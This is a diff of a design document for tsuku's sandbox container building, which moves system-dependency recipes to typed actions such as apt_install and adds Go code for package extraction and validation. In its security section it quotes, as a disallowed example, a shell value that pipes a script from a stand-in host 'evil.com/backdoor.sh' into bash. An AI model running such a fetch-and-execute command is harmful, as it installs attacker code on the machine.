@@ -1,8 +1,23 @@
-# DESIGN: Structured Primitives for System Dependencies
+# DESIGN: Sandbox Container Building for System Dependencies
 
 ## Status
 
 Proposed
+
+## Scope
+
+This design addresses **sandbox container building** for recipes with system dependencies. It complements [DESIGN-system-dependency-actions.md](DESIGN-system-dependency-actions.md) which defines the action vocabulary.
+
+| Concern | Design |
+|---------|--------|
+| Action vocabulary (what actions exist, how they compose) | [DESIGN-system-dependency-actions.md](DESIGN-system-dependency-actions.md) |
+| Platform filtering (`when` clause, `distro` detection) | [DESIGN-system-dependency-actions.md](DESIGN-system-dependency-actions.md) |
+| Documentation generation (`Describe()` interface) | [DESIGN-system-dependency-actions.md](DESIGN-system-dependency-actions.md) |
+| **Container building, caching, sandbox execution** | **This design** |
+
+**Current scope**: Documentation generation and sandbox container building. These features require machine-readable recipes but do NOT execute privileged operations on the user's host.
+
+**Future scope**: Host execution (where tsuku actually runs `apt-get install`, etc. on the user's machine) requires a dedicated design covering UX, consent flows, and security constraints. See [DESIGN-system-dependency-actions.md - Future Work: Host Execution](DESIGN-system-dependency-actions.md#host-execution).
 
 ## Upstream Design Reference
 
@@ -71,12 +86,18 @@ The `download` step uses `when` for platform filtering, but `require_system` use
 **Scope:**
 
 This design addresses:
-- Replacing `install_guide` with structured primitives (`packages` and `primitives`)
-- Moving platform filtering to the step-level `when` clause
 - Enabling sandbox testing for recipes with system dependencies
+- Minimal base container strategy
+- Container building from extracted package requirements
+- Container image caching
+
+This design depends on [DESIGN-system-dependency-actions.md](DESIGN-system-dependency-actions.md) for:
+- Action vocabulary (`apt_install`, `brew_cask`, `require_command`, etc.)
+- Platform filtering via `when` clause with `distro` field
+- Documentation generation via `Describe()` interface
 
 This design does NOT cover:
-- Tsuku installing system packages directly (tsuku remains non-root)
+- Tsuku installing system packages on the host (tsuku remains non-root on host)
 - Replacing package managers (apt, brew, etc.)
 - Container image management as a user-facing feature
 
@@ -304,7 +325,7 @@ Support core managers (apt, brew, dnf) with an extensible schema for adding othe
 
 ### Summary
 
-We remove the `install_guide` field entirely and replace it with structured primitives (`packages` or `primitives` parameters) on platform-specific steps filtered by `when`. This aligns `require_system` with how all other actions handle platform differences. The sandbox base container is stripped to minimal (tsuku + glibc only), forcing complete dependency declarations. We support core package managers initially with an extensible primitive system.
+We replace `install_guide` and the polymorphic `require_system` with typed actions (`apt_install`, `brew_cask`, `require_command`, etc.) from [DESIGN-system-dependency-actions.md](DESIGN-system-dependency-actions.md). Each action is a separate step filtered by `when` (including the new `distro` field for Linux distro detection). The sandbox base container is stripped to minimal, forcing complete dependency declarations. We support core package managers initially with an extensible action system.
 
 ### Rationale
 
@@ -312,18 +333,19 @@ We remove the `install_guide` field entirely and replace it with structured prim
 
 Platform filtering belongs at the step level, not inside parameters. This provides:
 - **Consistency**: Every action uses `when` for platform filtering
-- **Composability**: Easy to mix action types per platform (e.g., `download` on Linux, `require_system` on macOS)
+- **Composability**: Easy to mix action types per platform (e.g., `download` on Linux, `brew_install` on macOS)
 - **Simplicity**: Each step is self-contained with one platform target
 
-The verbosity trade-off (duplicate `command` field) is acceptable because:
-- Recipes are generated/validated by tooling, not hand-written at scale
+The verbosity trade-off (separate steps per platform) is acceptable because:
+- Recipes are validated by tooling, not hand-written at scale
 - Explicit is better than implicit for platform behavior
 - The `when` clause is already familiar to recipe authors
 
-**Why Option 2B (structured primitives) over 2A (free-form text):**
+**Why Option 2B (typed actions) over 2A (free-form text):**
 
-- **No shell, only primitives**: Arbitrary shell commands with sudo are a security risk that cannot be statically analyzed. By restricting to known primitives (`apt`, `apt_repo`, `brew`, `group_add`, `service_enable`), every recipe can be audited.
-- **Machine-executable**: Primitives are designed to be executed by tsuku (with user consent), not just displayed.
+- **No shell, only typed actions**: Arbitrary shell commands with sudo are a security risk that cannot be statically analyzed. By restricting to known actions (`apt_install`, `apt_repo`, `brew_cask`, `group_add`, `service_enable`), every recipe can be audited.
+- **Machine-executable**: Actions are designed to be executed by tsuku in sandbox containers.
+- **Documentation generation**: Actions implement `Describe()` for human-readable instructions.
 - **Content-addressed resources**: All external URLs (GPG keys, repository definitions) require SHA256 hashes.
 
 **Why Option 3A (minimal container) over 3B (current) or 3C (curated):**
@@ -335,52 +357,74 @@ The verbosity trade-off (duplicate `command` field) is acceptable because:
 **Why Option 4C (extensible core) over 4A or 4B:**
 
 - Start with proven patterns (apt, brew, dnf)
-- Add primitives as we encounter new patterns during recipe migration
+- Add actions as we encounter new patterns during recipe migration
 - Avoids over-engineering upfront while providing clear extension path
 
 ## Solution Architecture
 
 ### Design Principles
 
-1. **Platform filtering via `when`**: Use the existing step-level `when` clause, not parameter keys
-2. **No shell commands**: All operations use structured primitives that can be statically analyzed
+1. **Platform filtering via `when`**: Use the step-level `when` clause with `distro` support
+2. **No shell commands**: All operations use typed actions that can be statically analyzed
 3. **Content-addressed resources**: All external URLs require SHA256 hashes
-4. **Explicit user consent**: Privileged operations require user confirmation
-5. **Extensible vocabulary**: New primitives added through code as patterns emerge
+4. **Typed actions**: Each action has a well-defined schema from [DESIGN-system-dependency-actions.md](DESIGN-system-dependency-actions.md)
+5. **Extensible vocabulary**: New actions added through code as patterns emerge
 
 ### Step Structure
 
-Each `require_system` step targets a single platform via `when` and specifies either `packages` (simple) or `primitives` (complex):
+System dependencies use typed actions from [DESIGN-system-dependency-actions.md](DESIGN-system-dependency-actions.md). Each action targets a single platform via `when`:
 
 **Simple case** (single package manager):
 ```toml
-# Linux
+# Ubuntu/Debian
 [[steps]]
-action = "require_system"
-command = "docker"
-packages = { apt = ["docker.io"] }
-when = { os = ["linux"] }
+action = "apt_install"
+packages = ["docker.io"]
+when = { distro = ["ubuntu", "debian"] }
 
 # macOS
 [[steps]]
-action = "require_system"
-command = "docker"
-packages = { brew_cask = ["docker"] }
+action = "brew_cask"
+packages = ["docker"]
 when = { os = ["darwin"] }
+
+# Verify installation
+[[steps]]
+action = "require_command"
+command = "docker"
 ```
 
 **Complex case** (multiple operations):
 ```toml
+# Add Docker repository
 [[steps]]
-action = "require_system"
-command = "docker"
-primitives = [
-  { apt_repo = { url = "https://download.docker.com/linux/ubuntu", key_url = "https://download.docker.com/linux/ubuntu/gpg", key_sha256 = "1500c1f..." } },
-  { apt = ["docker-ce", "docker-ce-cli", "containerd.io"] },
-  { group_add = { group = "docker" } },
-  { service_enable = "docker" },
-]
+action = "apt_repo"
+url = "https://download.docker.com/linux/ubuntu"
+key_url = "https://download.docker.com/linux/ubuntu/gpg"
+key_sha256 = "1500c1f56fa9e26b9b8f42452a553675796ade0807cdce11975eb98170b3a570"
+when = { distro = ["ubuntu", "debian"] }
+
+# Install packages
+[[steps]]
+action = "apt_install"
+packages = ["docker-ce", "docker-ce-cli", "containerd.io"]
+when = { distro = ["ubuntu", "debian"] }
+
+# Post-install configuration
+[[steps]]
+action = "group_add"
+group = "docker"
 when = { os = ["linux"] }
+
+[[steps]]
+action = "service_enable"
+service = "docker"
+when = { os = ["linux"] }
+
+# Verify
+[[steps]]
+action = "require_command"
+command = "docker"
 ```
 
 **Mixed recipe** (tsuku installs on one platform, requires system on another):
@@ -397,72 +441,26 @@ when = { os = ["linux"] }
 
 # macOS - requires system package
 [[steps]]
-action = "require_system"
-command = "tool"
-packages = { brew = ["tool"] }
+action = "brew_install"
+packages = ["tool"]
 when = { os = ["darwin"] }
+
+# Verify on both platforms
+[[steps]]
+action = "require_command"
+command = "tool"
 ```
 
-### Parameter Schema
+### Action Vocabulary
 
-The `require_system` action accepts these parameters:
+See [DESIGN-system-dependency-actions.md](DESIGN-system-dependency-actions.md) for the canonical action vocabulary including:
 
-| Parameter | Type | Required | Description |
-|-----------|------|----------|-------------|
-| `command` | string | Yes | Command to check for |
-| `packages` | table | No* | Simple package spec (mutually exclusive with `primitives`) |
-| `primitives` | array | No* | Ordered primitive list (mutually exclusive with `packages`) |
-| `version_flag` | string | No | Flag to get version (e.g., "--version") |
-| `version_regex` | string | No | Regex to extract version |
-| `min_version` | string | No | Minimum required version |
+- **Package installation**: `apt_install`, `apt_repo`, `apt_ppa`, `brew_install`, `brew_cask`, `dnf_install`, `dnf_repo`, `pacman_install`
+- **System configuration**: `group_add`, `service_enable`, `service_start`
+- **Verification**: `require_command`
+- **Fallback**: `manual`
 
-*One of `packages` or `primitives` is required for sandbox testing.
-
-**`packages` shorthand forms:**
-```toml
-packages = { apt = ["pkg1", "pkg2"] }
-packages = { brew = ["pkg"] }
-packages = { brew_cask = ["pkg"] }
-packages = { dnf = ["pkg"] }
-```
-
-**`primitives` array:**
-```toml
-primitives = [
-  { apt_repo = { url = "...", key_url = "...", key_sha256 = "..." } },
-  { apt = ["pkg1", "pkg2"] },
-  { group_add = { group = "docker" } },
-]
-```
-
-### Primitive Vocabulary (Initial Set)
-
-Primitives are the atomic operations tsuku can execute. Each primitive has well-defined behavior and required parameters.
-
-**Package Installation:**
-
-| Primitive | Parameters | Privilege | Description |
-|-----------|------------|-----------|-------------|
-| `apt` | packages: []string | sudo | Install Debian/Ubuntu packages |
-| `apt_repo` | url, key_url, key_sha256 | sudo | Add APT repository with GPG key |
-| `dnf` | packages: []string | sudo | Install Fedora/RHEL packages |
-| `dnf_repo` | url, key_url, key_sha256 | sudo | Add DNF repository |
-| `brew` | packages: []string | user | Install Homebrew formulae |
-| `brew_cask` | packages: []string | user | Install Homebrew casks |
-
-**System Configuration:**
-
-| Primitive | Parameters | Privilege | Description |
-|-----------|------------|-----------|-------------|
-| `group_add` | group: string | sudo | Add current user to group |
-| `service_enable` | service: string | sudo | Enable systemd service |
-| `service_start` | service: string | sudo | Start systemd service |
-
-**Fallback:**
-
-| Primitive | Parameters | Privilege | Description |
-|-----------|------------|-----------|-------------|
-| `manual` | text: string | none | Display instructions for manual installation |
+Each action has a `Describe()` method for documentation generation and typed parameters for validation.
 
 ### Content-Addressing Requirements
 
@@ -482,101 +480,80 @@ All external resources must be content-addressed to prevent TOCTOU attacks:
 
 Preflight validation rejects recipes with unhashed external resources.
 
-### Primitive Execution
+### Action Execution in Sandbox
 
-When tsuku executes primitives (in sandbox or with user consent):
+When tsuku executes actions in sandbox containers, they run as root (no sudo needed):
 
 ```go
-type Primitive interface {
-    // Validate checks parameters without side effects
-    Validate() error
+// Action interface for typed actions
+type Action interface {
+    // Preflight validates parameters
+    Preflight(params map[string]interface{}) *PreflightResult
 
-    // RequiresPrivilege returns true if sudo is needed
-    RequiresPrivilege() bool
+    // ExecuteInSandbox runs the action inside a container (as root)
+    ExecuteInSandbox(ctx *SandboxContext) error
 
-    // Execute performs the operation
-    Execute(ctx *ExecutionContext) error
-
-    // Describe returns human-readable description for consent prompt
+    // Describe returns human-readable instructions for documentation
     Describe() string
 }
 
-// Example: apt primitive
-type AptPrimitive struct {
+// Example: apt_install action in sandbox
+type AptInstallAction struct {
     Packages []string
 }
 
-func (p *AptPrimitive) Execute(ctx *ExecutionContext) error {
-    args := append([]string{"install", "-y"}, p.Packages...)
-    return ctx.RunPrivileged("apt-get", args...)
+func (a *AptInstallAction) ExecuteInSandbox(ctx *SandboxContext) error {
+    args := append([]string{"install", "-y"}, a.Packages...)
+    return ctx.Run("apt-get", args...)
 }
 
-func (p *AptPrimitive) Describe() string {
-    return fmt.Sprintf("Install packages: %s", strings.Join(p.Packages, ", "))
+func (a *AptInstallAction) Describe() string {
+    return fmt.Sprintf("Install packages: sudo apt-get install %s",
+        strings.Join(a.Packages, " "))
 }
 ```
 
-### User Consent Flow
+See [DESIGN-system-dependency-actions.md - Documentation Generation](DESIGN-system-dependency-actions.md#documentation-generation) for the complete `Describe()` interface.
 
-Before executing privileged primitives, tsuku displays what will happen:
+### Documentation Generation
+
+When a recipe has system dependency actions that cannot be executed on the host, tsuku generates human-readable instructions using each action's `Describe()` method:
 
 ```
 $ tsuku install docker
 
-This recipe requires system-level changes:
+Docker requires system dependencies that tsuku cannot install directly.
 
-  1. Add APT repository: https://download.docker.com/linux/ubuntu
-     GPG key: sha256:1500c1f56fa9e26b9b8f42452a...
-  2. Install packages: docker-ce, docker-ce-cli, containerd.io
-  3. Add user to group: docker
-  4. Enable service: docker
+For Ubuntu/Debian:
 
-These operations require sudo privileges.
+  1. Add Docker repository:
+     curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo gpg --dearmor -o /etc/apt/keyrings/docker.gpg
+     echo "deb [signed-by=/etc/apt/keyrings/docker.gpg] https://download.docker.com/linux/ubuntu $(lsb_release -cs) stable" | sudo tee /etc/apt/sources.list.d/docker.list
 
-Proceed? [y/N/details]
+  2. Install packages:
+     sudo apt-get update && sudo apt-get install docker-ce docker-ce-cli containerd.io
+
+  3. Add yourself to docker group:
+     sudo usermod -aG docker $USER
+
+  4. Enable Docker service:
+     sudo systemctl enable docker
+
+After completing these steps, run: tsuku install docker --verify
 ```
 
-The `details` option shows the exact commands that will be executed.
-
-### Human-Readable Text Generation
-
-For display purposes (when not executing), tsuku generates instructions from primitives:
-
-```go
-func GenerateInstallGuide(primitives []Primitive) string {
-    var steps []string
-    for _, p := range primitives {
-        steps = append(steps, p.Describe())
-    }
-    return strings.Join(steps, "\n")
-}
-```
-
-Output example:
-```
-1. Add APT repository: https://download.docker.com/linux/ubuntu
-2. Run: sudo apt-get install docker-ce docker-ce-cli containerd.io
-3. Add current user to 'docker' group
-4. Enable systemd service: docker
-```
+See [DESIGN-system-dependency-actions.md - Documentation Generation](DESIGN-system-dependency-actions.md#documentation-generation) for the `Describe()` interface.
 
 ### Extension Model
 
-New primitives are added when patterns emerge during recipe migration:
+New actions are added when patterns emerge during recipe migration. See [DESIGN-system-dependency-actions.md - Future Work](DESIGN-system-dependency-actions.md#future-work) for the action extension process.
 
-1. **Identify pattern**: Multiple recipes need similar operation
-2. **Design primitive**: Define parameters, validation, execution
-3. **Implement in Go**: Add to `internal/actions/primitives/`
-4. **Add to vocabulary**: Update schema validation
-5. **Document**: Add to primitive table above
+This creates a higher review bar than shell commands - every new action type requires code review.
 
-This creates a higher review bar than shell commands - every new operation type requires code review.
-
-**Anticipated future primitives:**
-- `pacman`, `apk`, `zypper` - Additional package managers
-- `sysctl_set` - Kernel parameter configuration
-- `file_write` - Write configuration files (with path allowlist)
-- `env_set` - Set environment variables
+**Anticipated future actions** (from action vocabulary design):
+- `apk_install` for Alpine Linux
+- `zypper_install` for openSUSE
+- `nix_install` for NixOS
 
 ### Minimal Base Container
 
@@ -601,7 +578,7 @@ RUN apt-get update && apt-get install -y docker.io
 
 The sandbox executor is modified to:
 
-1. **Extract primitives**: Parse `require_system` steps from the plan. Steps are already platform-filtered by `when`, so extract `packages` or `primitives` directly.
+1. **Extract packages from typed actions**: Parse package installation actions from the plan. Steps are already platform-filtered by `when`.
 
 2. **Compute container image**: Generate a Dockerfile from the base image plus required packages. Hash the package list for caching.
 
@@ -610,62 +587,56 @@ The sandbox executor is modified to:
 4. **Run sandbox test**: Use the derived container for sandbox execution.
 
 ```go
-// DeriveContainerSpec extracts system packages from a plan's require_system steps.
+// ExtractPackages collects all package requirements from a filtered plan.
 // The plan is already filtered for the target platform, so steps contain only
-// the packages/primitives needed for that platform.
+// the actions needed for that platform.
 //
-// Returns (spec, nil) for recipes with complete package specs.
-// Returns (nil, nil) for recipes with no require_system steps.
-// Returns (nil, UnsupportedRecipeError) for recipes with require_system but no packages/primitives.
-func DeriveContainerSpec(plan *executor.InstallationPlan) (*ContainerSpec, error) {
-    spec := &ContainerSpec{
-        Base:       MinimalBaseImage,
-        Packages:   make(map[string][]string),
-        Primitives: nil,
-    }
+// Returns (packages, nil) for recipes with package installation actions.
+// Returns (nil, nil) for recipes with no system dependency actions.
+func ExtractPackages(plan *executor.InstallationPlan) (map[string][]string, error) {
+    packages := make(map[string][]string)
+    hasSystemDeps := false
 
-    hasRequireSystem := false
     for _, step := range plan.Steps {
-        if step.Action != "require_system" {
-            continue
-        }
-        hasRequireSystem = true
-
-        // Check for packages (simple form)
-        if packages, ok := step.Params["packages"]; ok {
-            for manager, pkgs := range parsePackages(packages) {
-                spec.Packages[manager] = append(spec.Packages[manager], pkgs...)
-            }
-            continue
-        }
-
-        // Check for primitives (complex form)
-        if primitives, ok := step.Params["primitives"]; ok {
-            parsed, err := parsePrimitives(primitives)
-            if err != nil {
-                return nil, err
-            }
-            spec.Primitives = append(spec.Primitives, parsed...)
-            continue
-        }
-
-        // No packages or primitives - cannot sandbox test
-        return nil, &UnsupportedRecipeError{
-            Recipe:  plan.Tool,
-            Command: step.Params["command"].(string),
-            Reason:  "missing 'packages' or 'primitives' for sandbox automation",
+        switch step.Action {
+        case "apt_install":
+            hasSystemDeps = true
+            packages["apt"] = append(packages["apt"], step.Packages...)
+        case "apt_repo":
+            hasSystemDeps = true
+            // apt_repo doesn't add packages directly, but signals we need apt
+        case "brew_install", "brew_cask":
+            hasSystemDeps = true
+            packages["brew"] = append(packages["brew"], step.Packages...)
+        case "dnf_install":
+            hasSystemDeps = true
+            packages["dnf"] = append(packages["dnf"], step.Packages...)
+        case "pacman_install":
+            hasSystemDeps = true
+            packages["pacman"] = append(packages["pacman"], step.Packages...)
         }
     }
 
-    if !hasRequireSystem {
+    if !hasSystemDeps {
         return nil, nil // No system dependencies - use default container
     }
 
-    return spec, nil
+    return packages, nil
+}
+
+// DeriveContainerSpec creates a container specification from extracted packages.
+func DeriveContainerSpec(packages map[string][]string) *ContainerSpec {
+    if packages == nil {
+        return nil
+    }
+    return &ContainerSpec{
+        Base:     MinimalBaseImage,
+        Packages: packages,
+    }
 }
 ```
 
-**Note:** The plan passed to `DeriveContainerSpec` is already filtered for the target platform. The `when` clause filtering happens during plan generation, so `require_system` steps in the plan only contain the packages needed for that specific platform.
+**Note:** The plan passed to `ExtractPackages` is already filtered for the target platform. The `when` clause filtering (including `distro` detection) happens during plan generation.
 
 ### Container Image Caching
 
@@ -693,94 +664,88 @@ The cache can be local (podman/docker image cache) or remote (GHCR for CI).
 
 ### Recipe Validation
 
-Update preflight validation for `require_system`:
+Each typed action validates its own parameters. Example for `apt_install`:
 
 ```go
-func (a *RequireSystemAction) Preflight(params map[string]interface{}) *PreflightResult {
+func (a *AptInstallAction) Preflight(params map[string]interface{}) *PreflightResult {
     result := &PreflightResult{}
 
-    // Command is required
-    if _, ok := GetString(params, "command"); !ok {
-        result.AddError("require_system action requires 'command' parameter")
+    // Packages is required
+    packages, ok := GetStringSlice(params, "packages")
+    if !ok || len(packages) == 0 {
+        result.AddError("apt_install action requires 'packages' parameter with at least one package")
     }
 
-    // Check for packages or primitives
-    hasPackages := params["packages"] != nil
-    hasPrimitives := params["primitives"] != nil
-
-    if hasPackages && hasPrimitives {
-        result.AddError("'packages' and 'primitives' are mutually exclusive")
-    }
-
-    if !hasPackages && !hasPrimitives {
-        result.AddWarning("missing 'packages' or 'primitives' - sandbox testing will be skipped")
-    }
-
-    // Validate packages structure
-    if hasPackages {
-        if err := validatePackagesStructure(params["packages"]); err != nil {
-            result.AddError("invalid packages structure: %s", err)
+    // Validate package names (no shell metacharacters)
+    for _, pkg := range packages {
+        if !isValidPackageName(pkg) {
+            result.AddError("invalid package name: %s", pkg)
         }
     }
 
-    // Validate primitives structure and content-addressing
-    if hasPrimitives {
-        if err := validatePrimitivesStructure(params["primitives"]); err != nil {
-            result.AddError("invalid primitives structure: %s", err)
-        }
+    return result
+}
+
+func (a *AptRepoAction) Preflight(params map[string]interface{}) *PreflightResult {
+    result := &PreflightResult{}
+
+    // url, key_url, key_sha256 are all required
+    if _, ok := GetString(params, "url"); !ok {
+        result.AddError("apt_repo action requires 'url' parameter")
+    }
+    if _, ok := GetString(params, "key_url"); !ok {
+        result.AddError("apt_repo action requires 'key_url' parameter")
+    }
+    if _, ok := GetString(params, "key_sha256"); !ok {
+        result.AddError("apt_repo action requires 'key_sha256' for content-addressing")
     }
 
     return result
 }
 ```
 
+See [DESIGN-system-dependency-actions.md](DESIGN-system-dependency-actions.md) for the complete action vocabulary with validation rules.
+
 ### Migration Path
 
 Since tsuku is pre-GA and all recipes are in the repo, we do a clean migration:
 
-1. **Remove `install_guide`**: Delete the field entirely from `require_system` action
-2. **Add `packages` and `primitives`**: Implement the new parameters
-3. **Migrate recipes**: Convert docker.toml, cuda.toml, test-tuples.toml to new format with `when` clauses
+1. **Remove `install_guide`**: Delete the field entirely from legacy `require_system` action
+2. **Implement typed actions**: Add `apt_install`, `brew_cask`, `require_command`, etc. per [DESIGN-system-dependency-actions.md](DESIGN-system-dependency-actions.md)
+3. **Migrate recipes**: Convert docker.toml, cuda.toml, test-tuples.toml to typed actions with `when` clauses including `distro`
 4. **Validate**: Ensure all recipes pass preflight and can be sandbox-tested
 
 ## Implementation Approach
 
-### Phase 1: Refactor require_system Action
+This design depends on [DESIGN-system-dependency-actions.md](DESIGN-system-dependency-actions.md) phases 1-3 being complete (distro detection, action vocabulary, documentation generation).
 
-1. Remove `install_guide` parameter from `require_system` action
-2. Add `packages` parameter (simple form: `{ apt = [...] }`)
-3. Add `primitives` parameter (complex form: array of primitive objects)
-4. Update preflight validation (mutually exclusive, structure validation)
-5. Migrate existing recipes (docker.toml, cuda.toml, test-tuples.toml) to use `when` clauses
+### Phase 1: Adopt Action Vocabulary
 
-### Phase 2: Primitive Framework
+1. Implement typed action handlers: `apt_install`, `apt_repo`, `brew_install`, `brew_cask`, etc.
+2. Remove `install_guide` parameter from legacy `require_system` action
+3. Implement `require_command` action (extracted from `require_system`)
+4. Migrate existing recipes (docker.toml, cuda.toml, test-tuples.toml) to typed actions with `when` clauses
 
-1. Create `internal/actions/primitives/` package with `Primitive` interface
-2. Implement core primitives: `apt`, `apt_repo`, `brew`, `brew_cask`, `manual`
-3. Add content-addressing validation for external URLs
-4. Implement `Describe()` for human-readable output generation
+### Phase 2: Documentation Generation
 
-### Phase 3: Sandbox Execution
+1. Implement `Describe()` for all typed actions
+2. Update CLI to display platform-filtered instructions when system deps are missing
+3. Add `--verify` flag to check if system deps are satisfied after manual installation
 
-1. Create minimal base container Dockerfile (tsuku + glibc only)
+### Phase 3: Sandbox Container Building
+
+1. Create minimal base container Dockerfile (tsuku + standard tools)
 2. Publish base image to GHCR (tsukumogami/sandbox-base)
-3. Implement primitive execution in sandbox context (root in container)
-4. Add container image caching by primitive hash
-5. Integrate with existing sandbox executor
+3. Implement `ExtractPackages()` to collect packages from plan
+4. Implement container building from extracted packages
+5. Add container image caching by package hash
+6. Integrate with existing sandbox executor
 
-### Phase 4: User Consent and Host Execution
+### Phase 4: Extension
 
-1. Implement user consent flow (display primitives, confirm)
-2. Add `--system-deps` flag to `tsuku install` to enable host execution
-3. Implement privilege escalation (sudo) for host execution
-4. Add audit logging for privileged operations
-5. Add dry-run mode (`--dry-run`) to show what would be executed
-
-### Phase 5: Extension
-
-1. Add primitives as needed: `dnf`, `dnf_repo`, `group_add`, `service_enable`
+1. Add actions as needed: `dnf_install`, `dnf_repo`, `pacman_install`
 2. Strip sandbox base container further as hidden dependencies are discovered
-3. Update CONTRIBUTING.md with primitive documentation
+3. Update CONTRIBUTING.md with action documentation
 
 ## Security Considerations
 
@@ -793,13 +758,13 @@ This design uses a layered trust model with explicit boundaries:
 | Recipe content | PR review by maintainers | Human review |
 | External resources | Content-addressing (SHA256) | Automated hash verification |
 | Package managers | Distribution signatures | apt/dnf GPG, Homebrew checksums |
-| Primitive operations | Fixed vocabulary in tsuku code | Code review for new primitives |
+| Action operations | Typed vocabulary from [DESIGN-system-dependency-actions.md](DESIGN-system-dependency-actions.md) | Code review for new actions |
 
-**Key security property**: No arbitrary shell commands. All operations use primitives with well-defined, auditable behavior. This enables static analysis of what a recipe will do.
+**Key security property**: No arbitrary shell commands. All operations use typed actions with well-defined, auditable behavior. This enables static analysis of what a recipe will do.
 
 ### Download Verification
 
-**External resources are content-addressed.** All URLs in primitives (GPG keys, repository definitions) require SHA256 hashes:
+**External resources are content-addressed.** All URLs in actions (GPG keys, repository definitions) require SHA256 hashes:
 
 ```toml
 { apt_repo = {
@@ -816,19 +781,15 @@ Package installation uses trusted package managers (apt, brew, dnf) which handle
 ### Execution Isolation
 
 **Sandbox context (containers):**
-- Primitives execute as root inside the container
+- Actions execute as root inside the container
 - Container is ephemeral - destroyed after test
 - No host filesystem access beyond explicit mounts
 - Resource limits (memory, CPU, process count)
 - No host network unless explicitly required
 
-**Host context (user machine):**
-- Primitives execute via sudo with explicit user consent
-- User must confirm each privileged operation
-- Audit log records what was executed
-- Dry-run mode available to preview operations
+**Host context**: See [DESIGN-system-dependency-actions.md - Future Work: Host Execution](DESIGN-system-dependency-actions.md#host-execution) for security constraints on future host execution.
 
-**Why no shell primitive:**
+**Why no shell action:**
 ```toml
 # NOT ALLOWED - arbitrary code execution
 { shell = "curl evil.com/backdoor.sh | bash" }
@@ -843,13 +804,13 @@ Once shell commands are allowed, static analysis becomes impossible. The attacke
 
 **Package manager trust**: This design trusts apt, brew, and dnf repositories. An attacker who compromises these repositories could inject malicious packages. This is an existing risk for anyone using these package managers - tsuku does not add new trust requirements.
 
-**Recipe review**: All primitives are visible in the TOML recipe. Reviewers can audit:
+**Recipe review**: All actions are visible in the TOML recipe. Reviewers can audit:
 - Which packages are installed
 - Which repositories are added (with their GPG keys)
 - Which groups the user is added to
 - Which services are enabled
 
-**Primitive vocabulary control**: New primitives require code changes to tsuku, creating a higher review bar than allowing arbitrary shell commands.
+**Action vocabulary control**: New actions require code changes to tsuku, creating a higher review bar than allowing arbitrary shell commands. See [DESIGN-system-dependency-actions.md](DESIGN-system-dependency-actions.md) for the canonical action vocabulary.
 
 **Content-addressing**: External URLs must have SHA256 hashes computed at review time. If an upstream resource changes, the hash check fails and installation is blocked.
 
@@ -860,31 +821,37 @@ Once shell commands are allowed, static analysis becomes impossible. The attacke
 - Only recipe plan, download cache, and tsuku binary (all read-only)
 - Container destroyed after execution
 
-**Host context:**
-- Primitives operate on system paths (e.g., `/etc/apt/sources.list.d/`)
-- No access to user home directory or personal files
-- Operations logged for audit trail
+**Host context**: Not applicable - tsuku does not execute system dependency actions on the host. See [DESIGN-system-dependency-actions.md - Future Work: Host Execution](DESIGN-system-dependency-actions.md#host-execution) for future considerations.
 
 ## Future Work
 
-The following items were identified during design review but are deferred for post-MVP implementation. They represent scaling considerations that will become relevant as the primitive vocabulary and recipe count grow.
+The following items were identified during design review but are deferred for post-MVP implementation.
+
+### Host Execution
+
+Host execution (where tsuku actually runs `apt-get install`, etc. on the user's machine) is out of scope for this design. It requires a dedicated design covering:
+
+- **UX considerations**: Consent flow, progress display, error recovery, rollback
+- **Security constraints**: Group allowlisting, repository allowlisting, tiered consent, audit logging
+
+See [DESIGN-system-dependency-actions.md - Future Work: Host Execution](DESIGN-system-dependency-actions.md#host-execution) for detailed security constraints that will apply when this feature is implemented.
 
 ### Tiered Extension Model
 
-The current design requires Go code changes for every new primitive. At scale (tens of thousands of recipes), this creates friction. A future tiered extension model could include:
+The current design requires Go code changes for every new action. At scale (tens of thousands of recipes), this creates friction. A future tiered extension model could include:
 
-1. **Core primitives (Go)**: Security-sensitive operations (apt_repo, group_add, service_enable) that require full code review
-2. **Composite primitives (TOML)**: Combinations of core primitives defined in recipe syntax (e.g., `add_docker_repo` = apt_repo + apt)
-3. **Verified scripts**: Reviewed shell scripts with attestation, for edge cases that don't fit the primitive model
+1. **Core actions (Go)**: Security-sensitive operations (apt_repo, group_add, service_enable) that require full code review
+2. **Composite actions (TOML)**: Combinations of core actions defined in recipe syntax (e.g., `add_docker_repo` = apt_repo + apt_install)
+3. **Verified scripts**: Reviewed shell scripts with attestation, for edge cases that don't fit the action model
 
-This would balance security (core primitives) with extensibility (composites and verified scripts).
+See [DESIGN-system-dependency-actions.md - Future Work: Composite Shorthand Syntax](DESIGN-system-dependency-actions.md#composite-shorthand-syntax) for related work on composite actions.
 
-### Automatic Primitive Analysis
+### Automatic Action Analysis
 
 A `tsuku analyze <recipe>` command could:
 
 1. Parse existing `install_guide` text instructions
-2. Propose structured `packages` primitives
+2. Propose typed actions (`apt_install`, `brew_cask`, etc.)
 3. Identify external resources needing SHA256 hashes
 4. Suggest migration patches
 
@@ -892,23 +859,21 @@ This would accelerate migration when scaling to thousands of recipes.
 
 ### Platform Version Constraints
 
-The `when` clause currently supports OS and architecture filtering, but apt packages vary by distribution version. Future work could extend `when` to support distribution versions:
+The `when` clause supports `distro` filtering (see [DESIGN-system-dependency-actions.md - D2: Distro Detection](DESIGN-system-dependency-actions.md#d2-distro-detection)), but not version constraints. Future work could extend `when` to support distribution versions:
 
 ```toml
 [[steps]]
-action = "require_system"
-command = "docker"
-packages = { apt = ["docker-ce"] }
-when = { os = ["linux"], distro = ["ubuntu-24.04"] }
+action = "apt_install"
+packages = ["docker-ce"]
+when = { distro = ["ubuntu>=24.04"] }
 
 [[steps]]
-action = "require_system"
-command = "docker"
-packages = { apt = ["docker.io"] }
-when = { os = ["linux"], distro = ["ubuntu-22.04"] }
+action = "apt_install"
+packages = ["docker.io"]
+when = { distro = ["ubuntu>=22.04", "ubuntu<24.04"] }
 ```
 
-This would require extending `WhenClause` to support distribution detection and matching.
+This requires defining version comparison semantics across distro versioning schemes (deferred per the action vocabulary design).
 
 ### Container Cache Optimization
 
@@ -920,35 +885,35 @@ At scale, the content-addressed cache may grow large. Future optimizations:
 
 ### Privilege Escalation Paths
 
-Certain primitives (`group_add`, `file_write`, `service_enable`) enable indirect privilege escalation. Future work should:
+Certain actions (`group_add`, `service_enable`) enable indirect privilege escalation. See [DESIGN-system-dependency-actions.md - Future Work: Host Execution](DESIGN-system-dependency-actions.md#host-execution) for:
 
-- Document which primitives create escalation paths
-- Consider allowlisting for sensitive primitives (e.g., only specific groups allowed)
-- Add runtime checks in host execution context
+- Group allowlisting (categorizing groups by risk level)
